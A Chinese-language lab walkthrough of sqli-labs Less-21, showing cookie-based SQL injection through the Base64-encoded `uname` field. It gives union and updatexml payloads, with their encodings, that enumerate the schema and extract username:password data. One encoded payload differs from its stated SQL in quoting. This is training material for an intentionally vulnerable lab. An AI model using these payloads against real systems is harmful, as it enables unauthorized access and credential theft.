# Sqli Labs Less-21 复现

Less-21 是基于 **Cookie 注入**的关卡，核心特点是：

- 注入点在 Cookie 的 `uname` 字段

- 注入内容需要经过 **Base64 编码**

- 闭合方式为 `')`（单引号+右括号）

---

#### 1. 环境准备

- 启动 sqli-labs 环境，访问 `Less-21`

- 先使用默认账号 `admin` / `admin` 登录，获取初始 Cookie

#### 2. 抓包分析注入点

使用 Burp Suite 拦截登录后的请求，查看 Cookie 字段：

```Plain Text

Cookie: uname=YWRtaW4=
```

- `YWRtaW4=` 是 `admin` 的 Base64 编码结果

- 从报错信息 `...near 'admin'') LIMIT 0,1'` 可判断闭合方式为 `')`

#### 3. 注入测试（验证注入点）

构造测试语句并编码：

|注入语句|Base64 编码结果|预期结果|
|---|---|---|
|`admin') and 1=1#`|`YWRtaW4nKSBhbmQgMT0xIw==`|页面正常显示|
|`admin') and 1=2#`|`YWRtaW4nKSBhbmQgMT0yIw==`|页面报错|
替换 Cookie 中的 `uname` 并重放请求，验证注入点存在。

---

#### 4. 核心注入步骤（Union 注入）

##### 步骤1：查询数据库名

构造语句：

```SQL

admin') union select 1,database()#
```

Base64 编码：

```Plain Text

YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpIw==
```

重放后得到数据库名（如 `security`）。

##### 步骤2：查询表名

构造语句：

```SQL

admin') union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#
```

Base64 编码：

```Plain Text

YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSxncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIw==
```

重放后得到表名（如 `users`）。

##### 步骤3：查询字段名

构造语句（针对 `users` 表）：

```SQL

admin') union select 1,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()#
```

Base64 编码：

```Plain Text

YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSxncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0idXNlcnMiIGFuZCB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKSM=
```

重放后得到字段名（如 `username`、`password`）。

##### 步骤4：查询敏感数据

构造语句：

```SQL

admin') union select 1,concat(username,0x3a,password) from users limit 0,1#
```

Base64 编码：

```Plain Text

YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSxjb25jYXQodXNlcm5hbWUsMHgzYSxwYXNzd29yZCkgZnJvbSB1c2VycyBsaW1pdCAwLDEj
```

重放后得到第一条用户数据（如 `admin:admin`），调整 `limit` 参数可获取更多数据。

---

#### 5. 报错注入（备选方案）

若 Union 注入被限制，可使用报错注入：

构造语句：

```SQL

admin') and updatexml(1,concat(0x7e,(select database()),0x7e),1)#
```

Base64 编码：

```Plain Text

YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSwxKSM=
```

重放后，报错信息中会直接显示数据库名。

---

### 关键总结 ✅

1. **注入点**：Cookie 的 `uname` 字段

2. **编码要求**：所有注入语句必须先进行 Base64 编码

3. **闭合方式**：`')`（单引号+右括号）

4. **核心流程**：测试注入点 → 查库 → 查表 → 查字段 → 查数据
> （注：文档部分内容可能由 AI 生成）